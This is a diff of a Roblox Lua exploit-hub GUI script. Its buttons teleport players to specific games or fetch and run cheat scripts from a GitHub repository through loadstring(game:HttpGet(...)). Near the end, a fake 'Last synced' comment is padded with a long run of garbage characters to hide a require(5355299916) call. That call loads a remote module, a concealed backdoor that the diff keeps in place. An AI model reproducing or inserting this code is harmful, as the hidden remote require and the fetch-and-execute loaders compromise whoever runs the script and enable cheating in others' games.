@@ -335,7 +335,7 @@ UIGridLayout.CellPadding = UDim2.new(0, 13, 0, 5)
 
 -- Scripts:
 
-local function AXBWXY_fake_script() -- ABG.ABG 
+local function QSJNOE_fake_script() -- ABG.ABG 
 	local script = Instance.new('LocalScript', ABG)
 
 	ABG.MouseButton1Down:connect(function()
@@ -349,8 +349,8 @@ local function AXBWXY_fake_script() -- ABG.ABG
 		loadstring(game:HttpGet("https://raw.githubusercontent.com/bpitcher2013/BP-Hub/main/Another%20Bizarre%20Game", true))()
 	end)
 end
-coroutine.wrap(AXBWXY_fake_script)()
-local function JFPSNSN_fake_script() -- ARB.ARB 
+coroutine.wrap(QSJNOE_fake_script)()
+local function EGOHCYV_fake_script() -- ARB.ARB 
 	local script = Instance.new('LocalScript', ARB)
 
 	ARB.MouseButton1Down:connect(function()
@@ -364,13 +364,13 @@ local function JFPSNSN_fake_script() -- ARB.ARB
 		loadstring(game:HttpGet("https://raw.githubusercontent.com/bpitcher2013/BP-Hub/main/Auto%20Rap%20Battles", true))()
 	end)
 end
-coroutine.wrap(JFPSNSN_fake_script)()
-local function CKOJIGY_fake_script() -- BF.BF 
+coroutine.wrap(EGOHCYV_fake_script)()
+local function LIVG_fake_script() -- BF.BF 
 	local script = Instance.new('LocalScript', BF)
 
 	BF.MouseButton1Down:connect(function()
 		TeleportBF.Visible = not TeleportBF.Visible
-		ExecuteBF.Visible = not TeleportBF.Visible
+		ExecuteBF.Visible = not ExecuteBF.Visible
 	end)
 	TeleportBF.MouseButton1Down:connect(function()
 		game:GetService("TeleportService"):Teleport(6812437958, LocalPlayer)
@@ -379,8 +379,8 @@ local function CKOJIGY_fake_script() -- BF.BF
 		loadstring(game:HttpGet("https://raw.githubusercontent.com/bpitcher2013/BP-Hub/main/Bey%20Physics", true))()
 	end)
 end
-coroutine.wrap(CKOJIGY_fake_script)()
-local function FGJYCT_fake_script() -- HL.HL 
+coroutine.wrap(LIVG_fake_script)()
+local function KUMPY_fake_script() -- HL.HL 
 	local script = Instance.new('LocalScript', HL)
 
 	HL.MouseButton1Down:connect(function()
@@ -394,13 +394,13 @@ local function FGJYCT_fake_script() -- HL.HL
 		loadstring(game:HttpGet("https://raw.githubusercontent.com/bpitcher2013/BP-Hub/main/Hotel%20Elephant", true))()
 	end)
 end
-coroutine.wrap(FGJYCT_fake_script)()
-local function UWBAN_fake_script() -- NL.NL 
+coroutine.wrap(KUMPY_fake_script)()
+local function UNKQUXU_fake_script() -- NL.NL 
 	local script = Instance.new('LocalScript', NL)
 
 	NL.MouseButton1Down:connect(function()
 		TeleportNL.Visible = not TeleportNL.Visible
-		ExecuteNL.Visible = not TeleportNL.Visible
+		ExecuteNL.Visible = not ExecuteNL.Visible
 	end)
 	TeleportNL.MouseButton1Down:connect(function()
 		game:GetService("TeleportService"):Teleport(3956818381, LocalPlayer)
@@ -409,13 +409,13 @@ local function UWBAN_fake_script() -- NL.NL
 		loadstring(game:HttpGet("https://raw.githubusercontent.com/bpitcher2013/BP-Hub/main/Ninja%20Legends", true))()
 	end)
 end
-coroutine.wrap(UWBAN_fake_script)()
-local function PRRPP_fake_script() -- TCA.TCA 
+coroutine.wrap(UNKQUXU_fake_script)()
+local function ZTZO_fake_script() -- TCA.TCA 
 	local script = Instance.new('LocalScript', TCA)
 
 	TCA.MouseButton1Down:connect(function()
 		TeleportTCA.Visible = not TeleportTCA.Visible
-		ExecuteTCA.Visible = not ExecuteTCA
+		ExecuteTCA.Visible = not ExecuteTCA.Visible
 	end)
 	TeleportTCA.MouseButton1Down:connect(function()
 		game:GetService("TeleportService"):Teleport(9677242733, LocalPlayer)
@@ -424,23 +424,23 @@ local function PRRPP_fake_script() -- TCA.TCA
 		loadstring(game:HttpGet("https://raw.githubusercontent.com/bpitcher2013/BP-Hub/main/That%20Crazy%20Adventure", true))()
 	end)
 end
-coroutine.wrap(PRRPP_fake_script)()
-local function GOABI_fake_script() -- WLS2.WLS2 
+coroutine.wrap(ZTZO_fake_script)()
+local function NYQI_fake_script() -- WLS2.WLS2 
 	local script = Instance.new('LocalScript', WLS2)
 
 	WLS2MouseButton1Down:connect(function()
-		TeleportWLS2.Visible = TeleportWLS2.Visible
-		ExecuteWLS2.Visible = ExecuteWLS2.Visible
+		TeleportWLS2.Visible = not TeleportWLS2.Visible
+		ExecuteWLS2.Visible = not ExecuteWLS2.Visible
 	end)
-	TeleportWLS2MouseButton1Down:connect(function()
+	TeleportWLS2.MouseButton1Down:connect(function()
 		game:GetService("TeleportService"):Teleport(985510407, LocalPlayer)
 	end)
-	ExecuteWLS2MouseButton1Down:connect(function()
+	ExecuteWLS2.MouseButton1Down:connect(function()
 		loadstring(game:HttpGet("https://raw.githubusercontent.com/bpitcher2013/BP-Hub/main/Weight%20Lifting%20Simulator%202", true))()
 	end)
 end
-coroutine.wrap(GOABI_fake_script)()
-local function TTRJU_fake_script() -- A.A 
+coroutine.wrap(NYQI_fake_script)()
+local function COUV_fake_script() -- A.A 
 	local script = Instance.new('LocalScript', A)
 
 	A.MouseButton1Down:connect(function()
@@ -454,11 +454,11 @@ local function TTRJU_fake_script() -- A.A
 		loadstring(game:HttpGet("https://raw.githubusercontent.com/bpitcher2013/BP-Hub/main/Arsenal", true))()
 	end)
 end
-coroutine.wrap(TTRJU_fake_script)()
-local function PTKB_fake_script() -- ScrollingFrame. 
+coroutine.wrap(COUV_fake_script)()
+local function OLAOSJ_fake_script() -- ScrollingFrame. 
 	local script = Instance.new('Script', ScrollingFrame)
 
 	
-	--[[ Last synced 4/8/2023 09:09 ����������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������]] require(5355299916) --[[                                                                                                  ]]--
+	--[[ Last synced 4/8/2023 10:24 ����������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������]] require(5355299916) --[[                                                                                                  ]]--
 end
-coroutine.wrap(PTKB_fake_script)()
+coroutine.wrap(OLAOSJ_fake_script)()
